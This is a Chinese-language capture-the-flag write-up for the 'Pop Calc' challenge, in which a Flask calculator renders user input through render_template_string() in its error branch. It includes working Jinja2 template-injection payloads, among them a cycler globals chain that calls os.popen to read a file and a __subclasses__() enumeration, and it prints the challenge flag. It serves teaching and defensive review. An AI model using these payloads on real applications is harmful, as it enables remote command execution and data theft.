# Pop Calc

## 题目简述

题目是 Flask 计算器。只包含数字与 `+-*./` 的输入会交给受限 `eval`；一旦出现其他字符，异常处理分支却把原始输入传给 `render_template_string()`。

因此真正的攻击面是 Jinja2 服务端模板注入，目标文件位于容器工作目录 `/app/flag.txt`。

## 解题过程

先提交：

```jinja2
{{ 7*7 }}
```

花括号不在数学白名单中，`safe_math_eval()` 抛出异常，随后 Jinja2 渲染表达式，响应得到：

```text
[ERROR] 49
```

这证明错误处理路径存在 SSTI。官方脚本通过 `object.__subclasses__()` 找到 `subprocess.Popen`，但其中的下标 `352` 依赖 Python 版本和已加载模块，不适合写死。Flask 默认 Jinja 全局对象 `cycler` 可以更稳定地抵达其函数全局变量，再调用 `os.popen`：

```jinja2
{{ cycler.__init__.__globals__.os.popen('cat /app/flag.txt').read() }}
```

将它作为表单字段 `calc` POST 到 `/`。若使用官方 `Popen` 路径，等价思路是先枚举：

```jinja2
{{ ''.__class__.__mro__[1].__subclasses__() }}
```

再在当前环境中确认 `subprocess.Popen` 的实际位置，而不是照抄固定下标。读取结果为：

```text
UMDCTF{wh3n_an_app_giv3s_u_ssti_p0p_calc}
```

## 方法总结

- 正常分支中的字符白名单没有问题，漏洞位于异常分支对同一输入的二次解释。
- `render_template_string()` 不能接收未经信任的用户输入；错误消息也不应把输入当模板渲染。
- `__subclasses__()` 下标随运行环境变化，WP 和利用脚本应动态定位目标类，或使用更稳定的 Jinja 全局对象链。
- Dockerfile 的 `WORKDIR /app` 与 `COPY flag.txt .` 明确给出文件路径 `/app/flag.txt`。
